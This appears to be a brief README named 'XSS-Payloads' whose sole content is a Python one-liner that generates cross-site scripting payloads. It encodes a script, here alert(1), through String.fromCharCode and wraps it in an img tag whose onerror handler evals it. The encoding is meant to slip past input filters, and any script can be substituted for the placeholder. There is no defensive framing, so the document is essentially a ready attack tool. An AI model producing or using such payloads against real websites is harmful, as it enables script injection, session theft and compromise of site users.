# XSS-Payloads

# Here is a cmd to generate payloads for XSS

`python3 -c "payload='alert(1)';p=f'<img src=0x17 onerror=eval(String.fromCharCode{tuple([ord(i) for i in payload])})>';print(p.replace(', ',','))"`